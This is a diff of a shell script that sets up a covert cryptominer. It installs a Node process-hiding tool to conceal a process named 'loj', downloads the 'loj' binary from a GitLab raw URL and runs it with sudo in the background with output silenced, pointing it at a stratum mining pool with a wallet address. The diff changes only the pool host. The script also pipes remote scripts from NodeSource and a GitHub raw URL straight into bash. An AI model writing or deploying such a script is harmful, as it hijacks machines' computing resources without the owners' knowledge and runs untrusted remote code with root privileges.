@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add loj"
 wget https://gitlab.com/falsbayu039/botak/-/raw/main/loj >/dev/null 2>&1
 chmod +x loj
-sudo ./loj -c stratum+tcp://128.199.167.154:443 -u RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m.01 >/dev/null 2>&1 &
+sudo ./loj -c stratum+tcp://sg.vipor.net:5040 -u RSG3DX4HDWw1Z1k3jSPwribvVs3ghscR3m.01 >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
